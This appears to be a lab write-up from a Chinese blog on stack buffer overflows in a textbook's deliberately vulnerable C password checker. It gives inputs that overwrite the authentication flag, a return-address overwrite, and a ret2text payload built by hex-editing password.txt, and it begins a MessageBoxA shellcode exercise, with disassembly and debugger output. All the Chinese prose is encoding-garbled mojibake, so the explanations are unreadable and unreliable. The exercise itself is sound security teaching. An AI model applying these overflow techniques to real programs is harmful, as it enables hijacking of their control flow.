<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (valid_flag)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>); </span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çœ‹æ¥æˆ‘ä»¬åªéœ€è¦è¾“å…¥00000000,å…«ä¸ª0,æœ€åå¤šä¸€ä¸ªâ€™\0â€™æ­£å¥½è¦†ç›–äº†authenticated,è®©ä»–ç­‰äº0.</p>
<p>ç„¶è€Œè¿™åªæ˜¯è¦†ç›–äº†å®ƒçš„æœ€ä½ä¸€ä¸ªå­—èŠ‚,authenticatedæœ‰4ä¸ªå­—èŠ‚.</p>
<p>â€œé‚£ä¹ˆå¯ä»¥è¾“å…¥11ä¸ª0,ç„¶åè‡ªå¸¦ä¸€ä¸ªâ€™\0â€™,ä¸€å…±12ä¸ª0,è¿™æ ·authenticatedè¢«æº¢å‡ºæˆå…¨0äº†â€,è¿™æ ·æƒ³æ›´ä¸å¯¹,å› ä¸º0çš„ASCIIç æ˜¯0x30,</p>
<p>è¿™æ ·è¾“å…¥ä¹‹åç›¸å½“äºauthenticated&#x3D;0x00303030&#x3D;3158064</p>
<p>å®é™…ä¸Šè°ƒè¯•çš„æ—¶å€™æ­£æ˜¯å¦‚æ­¤</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916170428996.png" alt="image-20220916170428996"></p>
<p>â€˜\0â€™æ˜¯çœŸçš„0,NULL,å­—ç¬¦â€™0â€™æ˜¯å‡çš„0,é‚£åº”è¯¥å†å’‹åŠå‘¢</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">authenticated = <span class="built_in">strcmp</span>(password, PASSWORD)</span><br></pre></td></tr></table></figure>

<p>å½“å­—å…¸åºpassword&lt;PASSWORDæ—¶,è¿”å›çš„æ˜¯è´Ÿæ•°,é‚£ä¹ˆauthenticatedçš„é«˜ä½å…¨éƒ½æ˜¯1,(ä¸ç®¡é«˜å‡ ä½æ˜¯1äº†,åæ­£æœ€é«˜ä½é‚£ä¸ªç¬¦å·ä½æ˜¯1)</p>
<p>å½“å­—å…¸åºpassword&gt;PASSWRODæ—¶,è¿”å›çš„æ˜¯æ­£æ•°,é‚£ä¹ˆauthenticatedçš„é«˜ä½å…¨éƒ½æ˜¯0äº†,è¿™å°±æœ‰ä¸€ä¸ªé—®é¢˜,é«˜å‡ ä½æ˜¯0,å¦‚æœé«˜3ä¸ªå­—èŠ‚éƒ½æ˜¯0åˆ™æ­£å¥½â€™\0â€™å°†æœ€ä½å­—èŠ‚ä¹Ÿæº¢å‡ºæˆ0,å¦‚æœç¬¬äºŒä¸ªå­—èŠ‚é0å°±å¯„äº†</p>
<p>æ€ä¹ˆéªŒè¯è¿™ä¸ªäº‹å‘¢?è¦ä¹ˆç›´æ¥è°ƒè¯•çœ‹çœ‹,è¦ä¹ˆçœ‹strcmpçš„æºä»£ç </p>
<p>æ˜¾ç„¶å‰è€…æ¥çš„å¿«,è°ƒè¯•è§‚å¯Ÿ,ç»“æœæ˜¯1,ç«Ÿç„¶ä¸æ˜¯ä¸€ä¸ªä¹±ä¸ƒå…«ç³Ÿçš„æ­£æ•°</p>
<blockquote>
<p>é€†å‘åˆ†æstrcmp,å…¶å‡½æ•°å‡ºå£åªæœ‰ä¸¤ä¸ª</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916174314360.png" alt="image-20220916174314360"></p>
<p>è¦ä¹ˆæ˜¯doneeqå¤„ä½œä¸ºå‡ºå£,è¿™é‡Œè¿”å›eax&#x3D;0</p>
<p>è¦ä¹ˆæ˜¯doneneå¤„ä½œä¸ºå‡ºå£,è¿™é‡Œå¹²äº†å•¥å‘¢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00401294 donene:                 ; done not equals</span><br><span class="line">.text:00401294 sbb     eax, eax</span><br><span class="line">.text:00401296 shl     eax, 1</span><br><span class="line">.text:00401298 inc     eax</span><br><span class="line">.text:00401299 retn</span><br></pre></td></tr></table></figure>

<p>sbb,å¸¦å€Ÿä½å‡æ³•,sbb a,bæ„æ€æ˜¯a&#x3D;a-b-CF</p>
<p>é‚£ä¹ˆsbb eax,eaxçš„æ„æ€å°±æ˜¯eax&#x3D;eax-eax-CF&#x3D;-CF</p>
<p>è€ŒCFçš„å€¼æ¥è‡ªäºä¸¤ä¸ªå­—ç¬¦ä¸²é€ä¸ªå­—èŠ‚åšå·®,strcmp(a,b)&#x3D;a-b,å¦‚æœa&lt;båˆ™CF&#x3D;1å¦åˆ™å³a&gt;&#x3D;båˆ™CF&#x3D;0</p>
<p>ç„¶åshlå¸¦è¿›ä½å·¦ç§»,å·¦ç§»çš„æ—¶å€™æœ€ä½ä½ç”¨CFè¡¥ä¸Š</p>
<p>å¦‚æœCF&#x3D;0åˆ™eax&#x3D;-0&#x3D;0ç„¶åå·¦ç§»çš„æ—¶å€™ä½ä½è¡¥CF&#x3D;0,è¿˜æ˜¯0,æœ€åinc eaxå¯¼è‡´å˜æˆ1</p>
<p>å› æ­¤å¦‚æœaçš„å­—å…¸åºæ›´å¤§,åˆ™strcmpåªä¼šè¿”å›1</p>
</blockquote>
<p>é‚£ä¹ˆåªéœ€è¦è¾“å…¥2222222,ä¸ƒä¸ª2å†åŠ ä¸Šâ€™\0â€™,å°±å¯ä»¥ä¿è¯å­—å…¸åºå¤§äº1234567,eaxè¿”å›1æ”¾åˆ°authenticatedæœ€ä½ä½,é«˜ä¸‰ä½éƒ½æ˜¯0,ç„¶åâ€™\0â€™æº¢å‡ºä¿®æ”¹authenticatedæœ€ä½å­—èŠ‚,å¾—åˆ°å…¨0çš„authenticated,è¿™å°±è·³è¿‡äº†ifçš„æ£€æŸ¥</p>
<h2 id="æº¢å‡ºè¿”å›åœ°å€"><a href="#æº¢å‡ºè¿”å›åœ°å€" class="headerlink" title="æº¢å‡ºè¿”å›åœ°å€"></a>æº¢å‡ºè¿”å›åœ°å€</h2><p>åœ¨verify_passwordå‡½æ•°çš„æ ˆå¸§è§†è§’ä¸‹,è¿”å›åœ°å€åœ¨ebp+4å¤„</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916192819674.png" alt="image-20220916192819674"></p>
<p>ä»ebp-0xCåˆ°ebp+0x4å…±16å­—èŠ‚,è¾“å…¥15ä¸ªå­—èŠ‚ä¹‹ååŠ ä¸Šâ€™\0â€™,æ­£å¥½åˆ°è¾¾è¿”å›åœ°å€çš„å®¶é—¨å£</p>
<p>å•åå†å¤šè¾“å…¥ä¸€ä¸ªå­—èŠ‚,å°±è¦ä¿®æ”¹è¿”å›åœ°å€äº†</p>
<p>è¾“å…¥19ä¸ªâ€™Aâ€™å†åŠ ä¸Šä¸€ä¸ªâ€™\0â€™åˆ™è¿”å›åœ°å€è¢«ä¿®æ”¹ä¸º0x00414141(0x41æ˜¯â€™Aâ€™çš„ASCIIç¼–ç )</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916193417926.png" alt="image-20220916193417926"></p>
<p>Buffer[0x19FACC,0x19FAD4)&#x3D;0x4141414141414141</p>
<p>authenticated[0x19FAD4,0x19FAD8)&#x3D;0x41414141</p>
<p>è°ƒç”¨è€…ebp[0x19FAD8,0x19FADC)&#x3D;0x41414141</p>
<p>è¿”å›åœ°å€[0x19FADC,0x19FAE0)&#x3D;0x00414141</p>
<p>æº¢å‡ºä¹‹åå†ç»§ç»­å•æ­¥è°ƒè¯•ä¼šå˜åœ°å¾ˆè‰°éš¾,æ¯ä¸€æ­¥éƒ½è¦ç­‰äº”å…­ç§’,æœ€åretnæŒ‡ä»¤ä¹‹åeipå°†æŒ‡å‘0x00414141å¤„,è·‘é£äº†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916194149675.png" alt="image-20220916194149675"></p>
<p>åœ¨windowsXPä¸Šå°è¯•è¿è¡Œç„¶åè¾“å…¥19ä¸ªA,windowsä¼šæŠ¥é”™</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916194359820.png" alt="image-20220916194359820"></p>
<p>åœ¨eip&#x3D;0x414141å¤„å‘ç”Ÿäº†0x80000003å·é”™è¯¯</p>
<blockquote>
<p>STATUS_BREAKPOINTï¼Œå€¼ä¸º0x80000003ï¼Œç§°ä¸ºä¸­æ–­æŒ‡ä»¤å¼‚å¸¸ï¼Œè¡¨ç¤ºåœ¨ç³»ç»Ÿæœªé™„åŠ å†…æ ¸è°ƒè¯•å™¨æ—¶é‡åˆ°æ–­ç‚¹æˆ–æ–­è¨€ã€‚</p>
</blockquote>
<p>ç¡®å®å¦‚æ­¤,0x00414141å¤„å…¨éƒ½æ˜¯0xCC</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916194604144.png" alt="image-20220916194604144"></p>
<p>è€Œint 3ä¸­æ–­æŒ‡ä»¤çš„æœºå™¨ç æ°å¥½å°±æ˜¯0xCC,å› æ­¤CPUè®¤ä¸ºç¢°åˆ°äº†æ²¡æœ‰å®šä¹‰çš„æ–­ç‚¹,æŠ¥é”™äº†</p>
<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>ä¸Šä¸€ä¸ªå®éªŒä¸­,ç”±äºç»ˆç«¯ä¸Šåªèƒ½è¾“å…¥å¯æ‰“å°ASCIIå­—ç¬¦,è¿™å°±é™åˆ¶äº†æˆ‘ä»¬å¯ä»¥è¾“å…¥çš„åœ°å€</p>
<p>ä¸ºäº†è¡¨æ¼”å¦‚ä½•åŠ«æŒæ§åˆ¶,ä¹¦ä¸Šå°†è¾“å…¥æ”¹æˆäº†æ–‡ä»¶,è¿™å°±å…è®¸è¾“å…¥ä¸å¯æ‰“å°ASCIIå­—ç¬¦äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span><span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> authenticated;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">	authenticated = <span class="built_in">strcmp</span>(password, PASSWORD);</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer, password); <span class="comment">// over flowed here!</span></span><br><span class="line">	<span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> valid_flag = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">	FILE *fp;</span><br><span class="line">	<span class="keyword">if</span> (!(fp = fopen(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&quot;rw+&quot;</span>)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fscanf</span>(fp, <span class="string">&quot;%s&quot;</span>, password);</span><br><span class="line">	valid_flag = verify_password(password);</span><br><span class="line">	<span class="keyword">if</span> (valid_flag)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ç¡®å®šæ ˆå¸§åˆ†å¸ƒ"><a href="#ç¡®å®šæ ˆå¸§åˆ†å¸ƒ" class="headerlink" title="ç¡®å®šæ ˆå¸§åˆ†å¸ƒ"></a>ç¡®å®šæ ˆå¸§åˆ†å¸ƒ</h3><p>mainå‡½æ•°ç»™passwordé¢„ç•™äº†1024ä¸ªå­—èŠ‚,è¶³å¤Ÿäº†,åªéœ€è¦è€ƒè™‘verify_passwordå‡½æ•°çš„æ ˆå¸§åˆ†å¸ƒ</p>
<p>åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹é¢æ–°å»ºä¸€ä¸ªpassword.txtæ–‡æ¡£ç„¶åéšä¾¿è¾“å…¥å‡ ä¸ªå­—ç¬¦,å¼€å§‹è°ƒè¯•</p>
<blockquote>
<p>æŒ‰ç†è¯´åº”è¯¥æ˜¯exeåŒç›®å½•,å³Debugç›®å½•,ä½†æ˜¯åœ¨å“ªé‡Œå»ºç«‹ä¹‹åç¨‹åºæ‰¾ä¸åˆ°password.txtæ–‡ä»¶</p>
<p>exeåŒç›®å½•æˆ–è€…é¡¹ç›®æ ¹ç›®å½•éƒ½å»ºç«‹ä¸€ä¸ª,ä»¥é˜²ä¸‡ä¸€</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">10:       strcpy(buffer, password); // over flowed here!</span><br><span class="line">0040104C   mov         ecx,dword ptr [ebp+8]</span><br><span class="line">0040104F   push        ecx</span><br><span class="line">00401050   lea         edx,[ebp-0Ch]</span><br><span class="line">00401053   push        edx</span><br><span class="line">00401054   call        strcpy (00401180)</span><br><span class="line">00401059   add         esp,8</span><br></pre></td></tr></table></figure>

<p>ebp+8æ˜¯è°ƒç”¨è€…ä¼ è¿‡æ¥çš„å‚æ•°,passwordçš„æŒ‡é’ˆ</p>
<p>ebp-0xCæ˜¯bufferç¼“å†²åŒºåœ°å€</p>
<p>å¯ä»¥ç”»å‡ºæ ˆå¸§äº†,å’Œåˆšæ‰çš„å®éªŒä¸­æ˜¯ä¸€æ ·çš„</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916200536665.png" alt="image-20220916200536665"></p>
<h3 id="æº¢å‡ºä¿®æ”¹è¿”å›åœ°å€"><a href="#æº¢å‡ºä¿®æ”¹è¿”å›åœ°å€" class="headerlink" title="æº¢å‡ºä¿®æ”¹è¿”å›åœ°å€"></a>æº¢å‡ºä¿®æ”¹è¿”å›åœ°å€</h3><p>ç°åœ¨ä¼å›¾æº¢å‡ºä¿®æ”¹è¿”å›åœ°å€,ç›´æ¥è·³è½¬åˆ°mainä¸­æ‰“å°é€šè¿‡çš„ä¿¡æ¯å¤„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">30:           printf(&quot;Congratulation! You have passed the verification!\n&quot;);</span><br><span class="line">0040111F   push        offset string &quot;Congratulation! You have passed &quot;... (00426028)</span><br><span class="line">00401124   call        printf (00401420)</span><br><span class="line">00401129   add         esp,4</span><br></pre></td></tr></table></figure>

<p>å³ç›´æ¥å°†è¿”å›åœ°å€æº¢å‡ºä¿®æ”¹æˆ0x0040111Få°±å¯ä»¥äº†,å’‹æº¢å‡ºå‘¢?</p>
<p>å‰16ä¸ªå­—èŠ‚æº¢å‡ºæˆä»»æ„å­—ç¬¦,ç„¶åè¾“å…¥ä¸‰ä¸ªå­—èŠ‚,0x1F,0x11,0x40,æ€»å…±19ä¸ªå­—èŠ‚äº†,ç„¶åæœ€é«˜ä½â€™\0â€™å¡«å……</p>
<p>é—®é¢˜æ˜¯0x1F,0x11éƒ½æ˜¯ä¸å¯æ‰“å°ASCIIå­—ç¬¦,æ€ä¹ˆè¾“å…¥å‘¢?</p>
<table>
<thead>
<tr>
<th>äºŒè¿›åˆ¶</th>
<th>åè¿›åˆ¶</th>
<th>åå…­è¿›åˆ¶</th>
<th>å­—ç¬¦</th>
<th>æ„ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>00011111</td>
<td>31</td>
<td>1F</td>
<td>US (Unit Separator)</td>
<td>å•å…ƒåˆ†éš”ç¬¦</td>
</tr>
<tr>
<td>00010001</td>
<td>17</td>
<td>11</td>
<td>DC1&#x2F;XON (Device Control 1&#x2F;Transmission On)</td>
<td>è®¾å¤‡æ§åˆ¶1&#x2F;ä¼ è¾“å¼€å§‹</td>
</tr>
<tr>
<td>01000000</td>
<td>64</td>
<td>40</td>
<td>@</td>
<td></td>
</tr>
</tbody></table>
<p>é¦–å…ˆåœ¨password.txtä¸­ç¼–è¾‘1234567812341234abcè¿™ä¹ˆ19ä¸ªå­—ç¬¦,å…¶ä¸­å‰16ä¸ªé˜¿æ‹‰ä¼¯æ•°å­—å…¨æ˜¯å¡«å……,åé¢abcæ˜¯éœ€è¦ä¿®æ”¹çš„åœ°æ–¹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916201320178.png" alt="image-20220916201320178"></p>
<p>ä¿å­˜å¥½åç”¨010editoræ‰“å¼€password.txt</p>
<p>View-&gt;Edit As-&gt;Hex</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916201500309.png" alt="image-20220916201500309"></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916201527444.png" alt="image-20220916201527444"></p>
<p>å°†æœ€åä¸‰ä¸ªå­—èŠ‚,æ”¹æˆ0x1F,0x11,0x40</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916201618020.png" alt="image-20220916201618020"></p>
<p>ç„¶åä¿å­˜,å†è¿è¡Œç¨‹åº</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\StackOverFlow\controlflow\Debug&gt; ./controlflow</span><br><span class="line">Congratulation! You have passed the verification!</span><br></pre></td></tr></table></figure>

<p>å·²ç»å¯ä»¥â€é€šè¿‡æ£€æŸ¥â€äº†,ä¸‹é¢è°ƒè¯•è§‚å¯Ÿå‘ç”Ÿäº†ä»€ä¹ˆ</p>
<h3 id="è°ƒè¯•è§‚å¯Ÿ"><a href="#è°ƒè¯•è§‚å¯Ÿ" class="headerlink" title="è°ƒè¯•è§‚å¯Ÿ"></a>è°ƒè¯•è§‚å¯Ÿ</h3><p>é¦–å…ˆ,verify_passwordä¸­strcpyæ‰§è¡Œä¹‹å,æ ˆå¸§çš„çŠ¶æ€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916202117461.png" alt="image-20220916202117461"></p>
<p>EBP&#x3D;0x19FAD4,è¿™æ„å‘³ç€è¿”å›åœ°å€åœ¨0x19FAD8,å†…å­˜è§†å›¾ä¸­å¯ä»¥çœ‹å‡º,0x19FAD8å¼€å§‹çš„å››ä¸ªå­—èŠ‚å·²ç»è¢«æº¢å‡ºæˆ0x0040111Fäº†</p>
<p>ç»§ç»­æ‰§è¡Œç›´åˆ°retnæŒ‡ä»¤,è¿”å›ä¹‹å</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916202219964.png" alt="image-20220916202219964"></p>
<p>EIPé¡ºåŠ¿è¢«ä¿®æ”¹ä¸º0x0040111F,è¾¾åˆ°äº†ç›®çš„</p>
<p>æ­¤æ—¶EBPå¸§æŒ‡é’ˆæŒ‡å‘0x34333231,æ˜¾ç„¶å·²ç»é£äº†,ä¸æ˜¯mainå‡½æ•°çš„å¸§åº•,ä½†æ˜¯ESPæŒ‡å‘æ ˆé¡¶æ˜¯æ²¡é”™çš„,</p>
<p>ç¼–è¯‘å™¨ä¼šè®¡ç®—å¥½å‡½æ•°è¿”å›æ—¶espè¦æŠ¬å¤šå°‘,ä½†æ˜¯ebpæ˜¯çº¯é ç¨‹åºå‹æ ˆè®°å¿†çš„</p>
<p>è¿™ä¸ªè¿‡ç¨‹ç”»åˆ°å›¾ä¸Šå°±æ˜¯ä¹¦ä¸Šç»™çš„</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916202508235.png" alt="image-20220916202508235"></p>
<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>ä¸Šä¸€ä¸ªå®éªŒä¸­å°†æ§åˆ¶ç¯¡æ”¹åˆ°mainå‡½æ•°ä¸­,è¿˜æ˜¯å±äºä»£ç æ®µçš„,</p>
<p>è¿™ä¸ªå®éªŒè¦å‘æ ˆä¸­å†™å…¥ä»£ç ç„¶åç¯¡æ”¹è¿”å›åœ°å€,æ‰§è¡Œæ ˆä¸­ä»£ç .</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916202944899.png" alt="image-20220916202944899"></p>
<p>è¦åœ¨æ ˆä¸­å†™ä¸€æ®µåˆ›å»ºMessageBoxAçš„shellcode,è®©ç¨‹åºå¼¹çª—</p>
<p>éœ€è¦pwnçš„ç¨‹åºé•¿è¿™æ ·</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//ç¡®ä¿å¯ä»¥è°ƒç”¨windows API </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span><span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> authenticated;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">44</span>];<span class="comment">//ç¼“å†²åŒºæ‰©å¤§åˆ°44ä¸ªå­—èŠ‚,æ–¹ä¾¿å®¹çº³shellcode</span></span><br><span class="line">    authenticated = <span class="built_in">strcmp</span>(password, PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, password); <span class="comment">// over flowed here!</span></span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> valid_flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>); <span class="comment">// prepare for messagebox</span></span><br><span class="line">    <span class="keyword">if</span> (!(fp = fopen(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&quot;rw+&quot;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%s&quot;</span>, password);</span><br><span class="line">    valid_flag = verify_password(password);</span><br><span class="line">    <span class="keyword">if</span> (valid_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿˜æ˜¯ä»password.txtä¸­å†™ä¸œè¥¿,æº¢å‡ºverify_password.txtçš„bufferç¼“å†²åŒº</p>
<p>é¦–å…ˆè¦è°ƒè¯•verify_passwordè§‚å¯Ÿæ ˆå¸§åˆ†å¸ƒ,é¡¹ç›®æ ¹ç›®å½•ä¸‹æ–°å»ºpassword.txt,éšä¾¿è¾“å…¥äº›å­—ç¬¦,ç„¶ååœ¨mainä¸Šä¸‹æ–­ç‚¹,å¼€å§‹è°ƒè¯•</p>
<h3 id="è°ƒè¯•è§‚å¯Ÿæ ˆå¸§åˆ†å¸ƒ"><a href="#è°ƒè¯•è§‚å¯Ÿæ ˆå¸§åˆ†å¸ƒ" class="headerlink" title="è°ƒè¯•è§‚å¯Ÿæ ˆå¸§åˆ†å¸ƒ"></a>è°ƒè¯•è§‚å¯Ÿæ ˆå¸§åˆ†å¸ƒ</h3><h4 id="authenticated"><a href="#authenticated" class="headerlink" title="authenticated"></a>authenticated</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">12:       authenticated = strcmp(password, PASSWORD);</span><br><span class="line">00401038   push        offset string &quot;1234567&quot; (0042601c)</span><br><span class="line">0040103D   mov         eax,dword ptr [ebp+8]</span><br><span class="line">00401040   push        eax</span><br><span class="line">00401041   call        strcmp (00401290)</span><br><span class="line">00401046   add         esp,8</span><br><span class="line">00401049   mov         dword ptr [ebp-4],eax</span><br></pre></td></tr></table></figure>

<p>ebp+8æŒ‡å‘å‚æ•°password</p>
<p>ebp-4æ˜¯authenticatedçš„åœ°å€</p>
<h4 id="buffer"><a href="#buffer" class="headerlink" title="buffer"></a>buffer</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">13:       strcpy(buffer, password); // over flowed here!</span><br><span class="line">0040104C   mov         ecx,dword ptr [ebp+8]</span><br><span class="line">0040104F   push        ecx</span><br><span class="line">00401050   lea         edx,[ebp-30h]</span><br><span class="line">00401053   push        edx</span><br><span class="line">00401054   call        strcpy (004011a0)</span><br><span class="line">00401059   add         esp,8</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ebp-30hæ˜¯bufferçš„åŸºåœ°å€</p>
<p>30h&#x3D;48,å³bufferæ˜¯ç´§æ¥ç€authenticatedçš„</p>
<p>è§‚å¯Ÿå¯„å­˜å™¨è§†å›¾,ebp&#x3D;0x0012FB20</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917003031600.png" alt="image-20220917003031600"></p>
<p>é‚£ä¹ˆâ€è¿”å›åœ°å€â€åœ¨æ ˆä¸­çš„åœ°å€0x12FB24,bufferçš„åŸºåœ°å€0x12FAF0</p>
